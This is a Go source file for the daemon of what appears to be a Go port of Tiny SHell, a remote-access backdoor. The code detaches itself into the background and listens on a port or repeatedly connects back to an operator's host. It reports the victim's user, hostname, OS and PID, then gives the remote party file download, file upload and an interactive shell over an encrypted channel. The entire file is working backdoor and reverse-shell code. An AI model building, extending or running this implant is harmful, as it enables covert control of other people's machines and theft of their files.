package tshd

import (
	"flag"
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/signal"
	"os/user"
	"path/filepath"
	"runtime"
	"syscall"
	"time"

	"tsh-go/internal/constants"
	"tsh-go/internal/pel"
	"tsh-go/internal/pty"
	"tsh-go/internal/utils"
)

var (
	DebugFile *os.File
	StartTime time.Time
)

func LogDebug(format string, a ...interface{}) {
	if DebugFile != nil {
		msg := fmt.Sprintf(format, a...)
		timestamp := time.Now().Format("15:04:05.000")
		DebugFile.WriteString(fmt.Sprintf("[%s] %s\n", timestamp, msg))
		DebugFile.Sync()
	}
}

func RunInBackground() {
	args := append([]string{"-daemon"}, os.Args[1:]...)
	fullpath, _ := filepath.Abs(os.Args[0])
	cmd := exec.Command(fullpath, args...)
	cmd.Env = os.Environ()
	cmd.Start()
}

func Run() {
	var secret, host string
	var port, delay int
	var isDaemon bool

	// Enable debug logging
	var err error
	DebugFile, err = os.OpenFile("tshd_debug.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		// Ignore error
	}
	StartTime = time.Now()
	LogDebug("Starting tshd...")

	flagset := flag.NewFlagSet(filepath.Base(os.Args[0]), flag.ExitOnError)
	flagset.StringVar(&secret, "s", "1234", "secret")
	flagset.StringVar(&host, "c", "", "connect back host")
	flagset.IntVar(&delay, "d", 5, "connect back delay")
	flagset.IntVar(&port, "p", 1234, "port")
	flagset.BoolVar(&isDaemon, "daemon", false, "(preserved) is in daemon")
	flagset.Parse(os.Args[1:])

	// if it's not daemon (child process),
	// run itself again with "-daemon" and exit the parent process.
	if !isDaemon {
		RunInBackground()
		os.Exit(0)
	}

	// don't let system kill our child process after closing cmd.exe
	sigchan := make(chan os.Signal, 1)
	signal.Notify(sigchan,
		syscall.SIGINT,
		syscall.SIGKILL,
		syscall.SIGTERM,
		syscall.SIGQUIT)

	StartDaemon(host, port, secret, delay)
}

func StartDaemon(host string, port int, secret string, delay int) {
	// Initialize StartTime if not already set
	if StartTime.IsZero() {
		StartTime = time.Now()
	}

	if host == "" {
		addr := fmt.Sprintf(":%d", port)
		ln, err := pel.Listen(addr, secret, true)
		if err != nil {
			return
		}
		for {
			layer, err := ln.Accept()
			if err == nil {
				sendMetadata(layer)
				go handleGeneric(layer)
			}
		}
	} else {
		// connect back mode
		addr := fmt.Sprintf("%s:%d", host, port)
		for {
			layer, err := pel.Dial(addr, secret, true)
			if err == nil {
				sendMetadata(layer)
				handleGeneric(layer)
			}
			time.Sleep(time.Duration(delay) * time.Second)
		}
	}
}

func sendMetadata(layer *pel.PktEncLayer) {
	u, err := user.Current()
	username := "?"
	if err == nil {
		username = u.Username
	}
	hostname, _ := os.Hostname()
	if hostname == "" {
		hostname = "?"
	}
	pid := os.Getpid()
	proc := filepath.Base(os.Args[0])
	meta := fmt.Sprintf("%s@%s|%s/%s|%d|%s|%d", username, hostname, runtime.GOOS, runtime.GOARCH, pid, proc, StartTime.Unix())
	layer.Write([]byte(meta))
}

// entry handler,
// automatically close connection after handling
// it's safe to run with goroutine
func handleGeneric(layer *pel.PktEncLayer) {
	defer layer.Close()
	defer func() {
		recover()
	}()
	buffer := make([]byte, 1)
	n, err := layer.Read(buffer)
	if err != nil || n != 1 {
		return
	}
	switch buffer[0] {
	case constants.GetFile:
		handleGetFile(layer, nil, "")
	case constants.PutFile:
		handlePutFile(layer, nil, "")
	case constants.RunShell:
		handleRunShell(layer)
	case constants.Terminate:
		os.Exit(0)
	}
}

func handleGetFile(layer *pel.PktEncLayer, initialData []byte, cwd string) {
	LogDebug("handleGetFile: Started")
	var filename string
	if len(initialData) > 0 {
		filename = string(initialData)
		LogDebug("handleGetFile: Used initialData for filename: %s", filename)
	} else {
		LogDebug("handleGetFile: Reading filename from layer...")
		buffer := make([]byte, constants.Bufsize)
		n, err := layer.Read(buffer)
		if err != nil {
			LogDebug("handleGetFile: Error reading filename: %v", err)
			return
		}
		filename = string(buffer[:n])
		LogDebug("handleGetFile: Read filename: %s", filename)
	}

	if cwd != "" && !filepath.IsAbs(filename) {
		filename = filepath.Join(cwd, filename)
	}

	f, err := os.Open(filename)
	if err != nil {
		LogDebug("handleGetFile: Failed to open file: %v", err)
		layer.Write([]byte{0x1D, constants.GetFile}) // ACK
		layer.Write([]byte{0})                       // Failure
		layer.Write([]byte(err.Error()))
		return
	}
	defer f.Close()
	fi, err := f.Stat()
	if err != nil {
		LogDebug("handleGetFile: Failed to stat file: %v", err)
		layer.Write([]byte{0x1D, constants.GetFile}) // ACK
		layer.Write([]byte{0})
		layer.Write([]byte(err.Error()))
		return
	}
	size := fi.Size()
	LogDebug("handleGetFile: File size: %d", size)

	layer.Write([]byte{0x1D, constants.GetFile}) // ACK
	layer.Write([]byte{1})                       // Success

	// Send Size
	sizeBuf := make([]byte, 8)
	for i := 0; i < 8; i++ {
		sizeBuf[i] = byte(size >> (56 - 8*i))
	}
	layer.Write(sizeBuf)

	buffer := make([]byte, constants.Bufsize)
	utils.CopyBuffer(layer, f, buffer)
	LogDebug("handleGetFile: Completed")
}

func handlePutFile(layer *pel.PktEncLayer, initialData []byte, cwd string) {
	LogDebug("handlePutFile: Started")
	var filename string
	if len(initialData) > 0 {
		filename = filepath.FromSlash(string(initialData))
		LogDebug("handlePutFile: Used initialData for filename: %s", filename)
	} else {
		LogDebug("handlePutFile: Reading filename from layer...")
		buffer := make([]byte, constants.Bufsize)
		n, err := layer.Read(buffer)
		if err != nil {
			LogDebug("handlePutFile: Error reading filename: %v", err)
			return
		}
		filename = filepath.FromSlash(string(buffer[:n]))
		LogDebug("handlePutFile: Read filename: %s", filename)
	}

	if cwd != "" && !filepath.IsAbs(filename) {
		filename = filepath.Join(cwd, filename)
	}

	f, err := os.OpenFile(filename, os.O_CREATE|os.O_RDWR, 0644)
	if err != nil {
		LogDebug("handlePutFile: Failed to open file: %v", err)
		layer.Write([]byte{0x1D, constants.PutFile}) // ACK
		layer.Write([]byte{0})                       // Failure
		layer.Write([]byte(err.Error()))
		return
	}
	defer f.Close()
	layer.Write([]byte{0x1D, constants.PutFile}) // ACK
	layer.Write([]byte{1})                       // Success

	// Recv Size
	LogDebug("handlePutFile: Reading size...")
	sizeBuf := make([]byte, 8)
	n, err := layer.Read(sizeBuf)
	if err != nil || n != 8 {
		LogDebug("handlePutFile: Error reading size: %v, n=%d", err, n)
		return
	}
	var size int64
	for i := 0; i < 8; i++ {
		size = (size << 8) | int64(sizeBuf[i])
	}
	LogDebug("handlePutFile: Size: %d", size)

	// Recv Data (exact size)
	buffer := make([]byte, constants.Bufsize)
	io.CopyBuffer(f, io.LimitReader(layer, size), buffer)
	// layer.Close() // Do not close layer here, let caller handle it
	LogDebug("handlePutFile: Completed")
}

func handleRunShell(layer *pel.PktEncLayer) {
	LogDebug("handleRunShell: Started")
	buffer := make([]byte, constants.Bufsize)
	buffer2 := make([]byte, constants.Bufsize)

	n, err := layer.Read(buffer)
	if err != nil {
		return
	}
	term := string(buffer[:n])

	n, err = layer.Read(buffer[:4])
	if err != nil || n != 4 {
		return
	}
	ws_row := int(buffer[0])<<8 + int(buffer[1])
	ws_col := int(buffer[2])<<8 + int(buffer[3])

	n, err = layer.Read(buffer)
	if err != nil {
		return
	}
	command := string(buffer[:n])
	LogDebug("handleRunShell: Command: %s, Term: %s", command, term)

	tp, err := pty.OpenPty(command, term, uint32(ws_col), uint32(ws_row))
	if err != nil {
		LogDebug("handleRunShell: PTY Error: %v", err)
		return
	}
	defer tp.Close()
	go func() {
		// Modified CopyBuffer to detect tshdexit
		buf := make([]byte, constants.Bufsize)
		var lastBytes []byte
		for {
			n, err := layer.Read(buf)
			if err != nil {
				tp.Close()
				return
			}
			if n > 0 {
				// Check for magic command byte (0x1D - Group Separator)
				if buf[0] == 0x1D {
					LogDebug("handleRunShell: Received Magic Byte 0x1D")
					// Consume the packet
					// The format should be: 0x1D <Opcode>
					// But Read might return partial.
					// Assuming client sends [0x1D, Opcode] in one go.
					var opcode byte
					var extra []byte
					if n >= 2 {
						opcode = buf[1]
						if n > 2 {
							extra = make([]byte, n-2)
							copy(extra, buf[2:n])
							LogDebug("handleRunShell: Extracted %d extra bytes", len(extra))
						}
					} else {
						// Read next byte
						tmp := make([]byte, 1)
						rn, rerr := layer.Read(tmp)
						if rerr != nil || rn != 1 {
							tp.Close()
							return
						}
						opcode = tmp[0]
					}

					switch opcode {
					case constants.GetFile:
						LogDebug("handleRunShell: Switching to handleGetFile")
						cwd := getCwd(tp.GetPID())
						handleGetFile(layer, extra, cwd)
					case constants.PutFile:
						LogDebug("handleRunShell: Switching to handlePutFile")
						cwd := getCwd(tp.GetPID())
						handlePutFile(layer, extra, cwd)
					case constants.Terminate:
						LogDebug("handleRunShell: Received Terminate")
						os.Exit(0)
					}
					continue
				}

				tp.StdIn().Write(buf[:n])

				// Check for tshdexit
				for i := 0; i < n; i++ {
					b := buf[i]
					lastBytes = append(lastBytes, b)
					if len(lastBytes) > 20 {
						lastBytes = lastBytes[len(lastBytes)-20:]
					}
					if len(lastBytes) >= 9 {
						suffix := string(lastBytes[len(lastBytes)-9:])
						if suffix == "tshdexit\r" || suffix == "tshdexit\n" {
							// FORCE EXIT DAEMON
							os.Exit(0)
						}
					}
				}
			}
		}
	}()
	utils.CopyBuffer(layer, tp.StdOut(), buffer2)
}

func getCwd(pid int) string {
	if pid <= 0 {
		return ""
	}
	if runtime.GOOS == "linux" {
		cwd, err := os.Readlink(fmt.Sprintf("/proc/%d/cwd", pid))
		if err == nil {
			return cwd
		}
	}
	return ""
}
